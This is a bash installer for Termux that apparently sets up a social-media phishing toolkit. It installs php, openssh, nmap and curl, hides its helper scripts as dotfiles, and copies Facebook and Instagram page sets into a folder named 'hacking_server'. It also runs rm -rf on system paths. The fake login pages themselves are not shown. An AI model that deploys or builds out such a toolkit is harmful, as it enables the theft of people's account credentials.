#!/bin/bash
if [ -d $HOME/server ]
then
	echo ''
	echo 'Checking folder directory'
	sleep 2
	echo '[✔] Perfect'
	sleep 2
	echo ''
else
	echo '[❌] Your folder not in HOME directory'
	sleep 2
	echo 'now Moving server folder to HOME'
	sleep 2
	mv `pwd` $HOME
	sh setup.sh
	exit
fi
apt-get update
apt-get upgrade -y
apt-get install unzip -y
apt-get install figlet -y
apt-get install python2 -y
apt-get install php -y
apt-get install openssh -y
apt-get install nmap -y
apt-get install curl -y
cd $HOME
rm .ser.sh
cd $HOME/server
cp ser.sh $HOME
cd $HOME
mv ser.sh .ser.sh
chmod +x .ser.sh
rm -rf /data/data/com.termux/files/usr/bin/server
ln -s $HOME/.ser.sh /data/data/com.termux/files/usr/bin/server
rm -rf /sdcard/hacking_server
mkdir /sdcard/hacking_server
mkdir /sdcard/hacking_server/facebook
mkdir /sdcard/hacking_server/facebook/php
mkdir /sdcard/hacking_server/instagram
cd $HOME/server
chmod +x facebook.sh
chmod +x serphp.py
cd $HOME/server
cd files/facebook/php
cp -r * /sdcard/hacking_server/facebook/php
cd $HOME/server/files/instagram
cp -r * /sdcard/hacking_server/instagram
cd $HOME/server
mkdir meta
mv localhost.sh .localhost.sh
mv webhost.sh .webhost.sh
mv facebook.sh .facebook.sh
mv instagram.sh .instagram.sh
clear
echo ""
echo ""
echo "just execute [server]"
